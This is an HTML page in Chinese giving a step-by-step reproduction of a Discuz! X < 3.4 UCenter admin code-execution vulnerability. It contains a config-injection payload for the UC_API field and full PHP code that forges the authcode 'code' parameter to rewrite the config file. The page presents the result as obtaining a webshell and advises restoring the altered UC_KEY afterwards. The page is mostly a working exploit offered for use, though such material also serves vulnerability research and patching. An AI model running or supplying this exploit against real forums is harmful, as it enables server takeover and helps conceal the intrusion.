<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="discuz-x--34-uc_center-后台代码执行漏洞"><span class="csDE05BCC">Discuz! X &lt; 3.4 uc_center </span><span class="csECDA2D3">后台代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Discuz! X &lt; 3.4</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">进入后台站长</span><span class="cs8926E06">-Ucenter</span><span class="cs9C1B1871">设置，设置</span><span class="cs8926E06">UC_KEY=</span><span class="cs9C1B1871">随意</span><span class="cs8926E06">(</span><span class="cs9C1B1871">一定要记住，后面要用</span><span class="cs8926E06">),</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">UC_API= http://www.0-sec.org/discuz34/uc_server&#39;);phpinfo();//</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">成功写进配置文件，这里单引号被转移了，我们接下来使用</span><span class="cs8926E06">UC_KEY(dz)</span><span class="cs9C1B1871">去调用</span><span class="cs8926E06">api/uc.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">updateapps</span><span class="cs9C1B1871">函数更新</span><span class="cs8926E06">UC_API</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用</span><span class="cs8926E06">UC_KEY(dz) </span><span class="cs9C1B1871">生成</span><span class="cs8926E06">code</span><span class="cs9C1B1871">参数，使用过</span><span class="cs8926E06">UC_KEY(dz) GetWebShell</span><span class="cs9C1B1871">的同学肯定不陌生，这里使用的</span><span class="cs8926E06">UC_KEY(dz)</span><span class="cs9C1B1871">就是上面我们设置的。</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$uc_key=&quot;123456&quot;;//</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$time = time() + 720000;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$code = authcode($str,&quot;ENCODE&quot;,$uc_key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$code = str_replace(&#39;+&#39;,&#39;%2b&#39;,$code);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$code = str_replace(&#39;/&#39;,&#39;%2f&#39;,$code);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo $code;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$ckey_length = 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$key = md5($key != &#39;&#39; ? $key : &#39;123456&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$keya = md5(substr($key, 0, 16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$keyb = md5(substr($key, 16, 16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;$cryptkey = $keya.md5($keya.$keyc);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$key_length = strlen($cryptkey);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;$string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$string_length = strlen($string);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;$result = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$box = range(0, 255);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;$rndkey = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for($i = 0; $i &lt;= 255; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;for($j = $i = 0; $i &lt; 256; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$tmp = $box[$i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$box[$i] = $box[$j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$box[$j] = $tmp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;for($a = $j = $i = 0; $i &lt; $string_length; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$a = ($a + 1) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$j = ($j + $box[$a]) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$tmp = $box[$a];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$box[$a] = $box[$j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$box[$j] = $tmp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;if($operation == &#39;DECODE&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return substr($result, 26);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">将生成的数据带入</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">请求中的</span><span class="cs8926E06">code </span><span class="cs9C1B1871">参数，发送数据包</span><span class="cs8926E06"><br/>3.png</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs8926E06"> http://www.0-sec.org/discuz34/config/config_ucenter.php </span><span class="cs9C1B1871">代码执行成功</span><span class="cs8926E06"><br/>4.png</span></p><p class="cs40DD2BC9"><span class="cs8926E06">5.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">到此成功</span><span class="cs8926E06">GetWebShell</span><span class="cs9C1B1871">，在这个过程中，有一点需要注意的是，我们修改了程序原有的</span><span class="cs8926E06">UC_KEY(dz)</span><span class="cs9C1B1871">，成功</span><span class="cs8926E06">GetWebShell</span><span class="cs9C1B1871">以后一定要修复，有</span><span class="cs8926E06">2</span><span class="cs9C1B1871">中方法：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">从数据库中读取</span><span class="cs8926E06">authkey(uc_server)</span><span class="cs9C1B1871">，通过</span><span class="cs8926E06">UC_MYKEY</span><span class="cs9C1B1871">解密获得</span><span class="cs8926E06">UC_KEY(dz)</span><span class="cs9C1B1871">，当然有可能</span><span class="cs8926E06">authkey(uc_server)</span><span class="cs9C1B1871">就是</span><span class="cs8926E06">UC_KEY(dz)</span><span class="cs9C1B1871">。</span></li><li class="cs24C36B3"><span class="cs9C1B1871">直接进入</span><span class="cs8926E06">Ucenter</span><span class="cs9C1B1871">后台修改</span><span class="cs8926E06">UC_KEY</span><span class="cs9C1B1871">，修改成我们</span><span class="cs8926E06">GetWebShell</span><span class="cs9C1B1871">过程中所设置的值。</span></li></ul>
	</body>
</html>
